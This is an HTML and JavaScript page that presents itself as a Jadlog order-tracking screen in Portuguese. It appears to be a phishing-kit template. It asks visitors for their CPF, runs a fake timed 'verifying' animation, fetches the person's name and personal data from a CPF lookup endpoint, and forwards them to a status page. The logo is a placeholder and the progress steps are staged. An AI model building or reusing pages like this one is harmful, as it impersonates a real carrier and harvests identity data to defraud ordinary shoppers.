<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Jadlog – Acompanhe seu Pedido</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="card">

    <div class="logo-wrap">
      <img class="stage-logo" src="{{HEADER_LOGO_URL}}" alt="Logo"/>
    </div>

    <h1 class="card-title">ACOMPANHE SEU PEDIDO</h1>
    <p class="card-subtitle">
      Para acompanhar seu pedido, preencha o campo abaixo com os dados fornecidos durante a compra.
    </p>

    <input
      type="text"
      id="cpfInput"
      class="cpf-input"
      placeholder="CPF"
      maxlength="14"
      inputmode="numeric"
    />

    <p class="error-msg" id="errorMsg">Por favor, informe seu CPF para continuar.</p>

    <button class="btn-primary" id="btnRastrear" onclick="rastrear()">Acompanhar Pedido</button>

  </div>

  <!-- OVERLAY DE LOADING -->
  <div id="loadingOverlay">
    <div class="loading-box">
      <div class="loading-logo">
        <img class="stage-logo" src="{{HEADER_LOGO_URL}}" alt="Logo"/>
      </div>
      <div class="loading-spinner">
        <div class="spinner-ring"></div>
      </div>
      <p class="loading-title">Consultando pedido...</p>
      <p class="loading-sub">Aguarde enquanto buscamos as informações</p>
      <div class="loading-steps">
        <div class="lstep" id="lstep1">
          <span class="lstep-dot"></span> Verificando CPF
        </div>
        <div class="lstep" id="lstep2">
          <span class="lstep-dot"></span> Localizando pedido
        </div>
        <div class="lstep" id="lstep3">
          <span class="lstep-dot"></span> Carregando status
        </div>
      </div>
    </div>
  </div>

  <style>
    .stage-logo {
      display: block;
      width: 100px;
      height: 38px;
      object-fit: contain;
      object-position: center;
    }

    #loadingOverlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.7);
      backdrop-filter: blur(4px);
      z-index: 999;
      align-items: center;
      justify-content: center;
    }

    #loadingOverlay.active {
      display: flex;
    }

    .loading-box {
      background: #fff;
      border-radius: 16px;
      padding: 36px 32px;
      text-align: center;
      width: 88%;
      max-width: 340px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      animation: popIn 0.3s ease;
    }

    @keyframes popIn {
      from { transform: scale(0.88); opacity: 0; }
      to   { transform: scale(1);    opacity: 1; }
    }

    .loading-logo { margin-bottom: 20px; }

    .loading-spinner {
      display: flex;
      justify-content: center;
      margin-bottom: 18px;
    }

    .spinner-ring {
      width: 48px;
      height: 48px;
      border: 4px solid #e5e7eb;
      border-top-color: #1a56db;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .loading-title {
      font-size: 16px;
      font-weight: 700;
      color: #111;
      margin-bottom: 4px;
    }

    .loading-sub {
      font-size: 13px;
      color: #888;
      margin-bottom: 20px;
    }

    .loading-steps {
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-align: left;
    }

    .lstep {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 13px;
      color: #aaa;
      font-weight: 500;
      transition: color 0.3s;
    }

    .lstep.done { color: #22a045; }
    .lstep.active-step { color: #1a56db; }

    .lstep-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #e5e7eb;
      display: inline-block;
      flex-shrink: 0;
      transition: background 0.3s;
    }

    .lstep.done .lstep-dot { background: #22a045; }
    .lstep.active-step .lstep-dot {
      background: #1a56db;
      animation: pulse 0.8s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50%       { opacity: 0.4; }
    }
  </style>

  <script>
    const cpfInput = document.getElementById('cpfInput');
    const errorMsg = document.getElementById('errorMsg');

    cpfInput.addEventListener('input', function () {
      let v = this.value.replace(/\D/g, '');
      if (v.length > 11) v = v.slice(0, 11);
      if (v.length > 9)      v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
      else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
      else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
      this.value = v;
      errorMsg.classList.remove('show');
    });

    cpfInput.addEventListener('keydown', e => { if (e.key === 'Enter') rastrear(); });

    function setStep(idx, status) {
      const steps = ['lstep1','lstep2','lstep3'];
      const el = document.getElementById(steps[idx]);
      el.classList.remove('active-step','done');
      if (status === 'active') el.classList.add('active-step');
      if (status === 'done')   el.classList.add('done');
    }

    async function rastrear() {
      const cpf = cpfInput.value.trim();
      if (!cpf) {
        errorMsg.classList.add('show');
        cpfInput.focus();
        return;
      }

      const cpfNumeros = cpf.replace(/\D/g, '');
      if (cpfNumeros.length !== 11) {
        errorMsg.textContent = 'Informe um CPF válido com 11 dígitos.';
        errorMsg.classList.add('show');
        cpfInput.focus();
        return;
      }
      sessionStorage.setItem('fl_cpf', cpfNumeros);
      sessionStorage.removeItem('fl_nome');
      sessionStorage.removeItem('fl_nome_cpf');

      // mostra overlay
      document.getElementById('loadingOverlay').classList.add('active');

      // step 1 — verificando CPF
      setStep(0, 'active');
      await sleep(700);
      setStep(0, 'done');

      // step 2 — consultando API
      setStep(1, 'active');
      let nome = '';
      try {
        const res  = await fetch('/api/public/cpf?cpf=' + cpfNumeros);
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'CPF não localizado');
        nome = extrairNome(data) || '';
        if (!nome) throw new Error('CPF não localizado');
        sessionStorage.setItem('fl_nome', toTitleCase(nome));
        sessionStorage.setItem('fl_nome_cpf', cpfNumeros);
      } catch(e) {
        document.getElementById('loadingOverlay').classList.remove('active');
        errorMsg.textContent = e instanceof Error ? e.message : 'Não foi possível consultar este CPF.';
        errorMsg.classList.add('show');
        return;
      }
      setStep(1, 'done');

      // step 3 — carregando status
      setStep(2, 'active');
      await sleep(600);
      setStep(2, 'done');

      await sleep(300);
      const nomeParam = nome ? '&nome=' + encodeURIComponent(toTitleCase(nome)) : '';
      window.location.href = '/status?cpf=' + cpfNumeros + nomeParam;
    }

    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    function extrairNome(data) {
      if (data.nome) return data.nome;
      if (data.dadosPessoais && data.dadosPessoais.nome) return data.dadosPessoais.nome;
      return null;
    }

    function toTitleCase(str) {
      const minors = ['de','da','do','das','dos','e','a','o'];
      return str.toLowerCase().split(' ').map((w, i) =>
        i === 0 || !minors.includes(w) ? w.charAt(0).toUpperCase() + w.slice(1) : w
      ).join(' ');
    }
  </script>
</body>
</html>
